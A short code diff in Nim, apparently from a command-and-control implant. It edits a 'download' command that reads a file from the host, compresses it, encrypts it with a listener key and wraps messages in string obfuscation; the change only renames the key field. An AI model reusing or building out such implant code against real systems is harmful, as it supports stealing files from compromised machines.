@@ -30,7 +30,7 @@ proc download*(li : Listener, cmdGuid : string,  args : varargs[string]) : strin
 
     # Read the file only if it is a valid file path
     if fileExists(filePath):
-        file = encryptData(compress(readFile(filePath)), li.cryptKey)
+        file = encryptData(compress(readFile(filePath)), li.UNIQUE_XOR_KEY)
     else:
         result = obf("Path to download is not a file. Usage: 'download [remote file] <optional: local destination path>'.")
         return
